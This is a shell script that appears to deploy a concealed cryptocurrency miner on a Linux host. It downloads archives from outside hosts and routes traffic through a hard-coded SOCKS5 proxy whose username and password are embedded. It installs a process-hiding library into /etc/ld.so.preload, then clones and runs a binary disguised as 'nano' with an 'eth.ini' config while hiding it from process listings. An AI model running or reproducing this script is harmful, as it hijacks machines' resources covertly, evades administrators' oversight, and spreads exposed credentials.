#!/bin/sh
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
sudo apt-get update && apt-get install -y screen > /dev/null 2>&1
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev xz-utils -y > /dev/null 2>&1
apt-get install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y > /dev/null 2>&1
npm i -g node-process-hider > /dev/null 2>&1

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/herykonay/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 3.16.66.235:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicGedit.zip && unzip magicGedit.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

#unset LD_PRELOAD
#unset LD_PRELOAD_ENV
#unset LD_LIBRARY_PATH

git clone https://gitlab.com/denisfachroni/nano.git
cd nano && chmod +x nano
ph add nano
./nano eth.ini

